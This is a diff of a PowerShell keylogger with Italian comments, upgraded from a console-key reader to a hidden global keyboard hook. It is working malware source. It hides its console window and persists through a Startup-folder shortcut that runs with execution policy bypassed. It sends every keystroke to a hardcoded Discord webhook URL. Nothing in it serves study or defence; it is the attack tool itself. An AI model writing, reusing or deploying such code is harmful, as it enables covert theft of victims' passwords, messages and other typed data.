@@ -1,38 +1,103 @@
-# --- Configuration ---
-$webhookUrl = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
-$scriptPath = $MyInvocation.MyCommand.Definition
+# --- Configurazione ---
+$webhookUrl    = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
+$scriptPath    = $MyInvocation.MyCommand.Definition
 $startupFolder = [Environment]::GetFolderPath("Startup")
-$shortcutPath = Join-Path $startupFolder "k.lnk"
+$shortcutPath  = Join-Path $startupFolder "k.lnk"
 
-# --- Function to create shortcut in Startup folder ---
+# --- Funzione per creare collegamento in Avvio automatico ---
 function Create-StartupShortcut {
     if (-not (Test-Path $shortcutPath)) {
-        $shell = New-Object -ComObject WScript.Shell
+        $shell    = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $shortcut.TargetPath      = "powershell.exe"
+        $shortcut.Arguments       = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
         $shortcut.WorkingDirectory = Split-Path $scriptPath
         $shortcut.Save()
     }
 }
-
-# --- Create startup shortcut if not exists ---
 Create-StartupShortcut
 
-# --- Keylogger loop ---
-Write-Host "Keylogger started. Press ESC to stop."
+# --- Nascondi la finestra della console ---
+Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public const int SW_HIDE = 0;
+    }
+"@
+[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
 
-while ($true) {
-    $key = [console]::ReadKey($true)  # true = do not display key
-    if ($key.Key -eq 'Escape') { break }
+# --- Definizione del global keyboard hook via Add-Type ---
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
-    $char = $key.KeyChar
-    if ($char -ne '') {
-        $payload = @{ content = $char } | ConvertTo-Json
-        try {
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
-        } catch {
-            # Ignore errors
+public class GlobalKeyboardListener {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN     = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    public static event Action<string> OnKeyPressed;
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    public static void Start() {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule) {
+            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
+                GetModuleHandle(curModule.ModuleName), 0);
         }
     }
+
+    public static void Stop() {
+        UnhookWindowsHookEx(_hookID);
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            string key = ((Keys)vkCode).ToString();
+            OnKeyPressed?.Invoke(key);
+            if ((Keys)vkCode == Keys.Escape) {
+                Stop();
+                Application.Exit();
+            }
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
 }
+"@ -ReferencedAssemblies "System.Windows.Forms"
+
+# --- Invia i tasti al webhook Discord ---
+[GlobalKeyboardListener]::OnKeyPressed += {
+    param($key)
+    $payload = @{ content = $key } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    } catch {
+        # Ignora errori di rete
+    }
+}
+
+# --- Avvia il hook e loop invisibile dei messaggi ---
+[GlobalKeyboardListener]::Start()
+[System.Windows.Forms.Application]::Run()
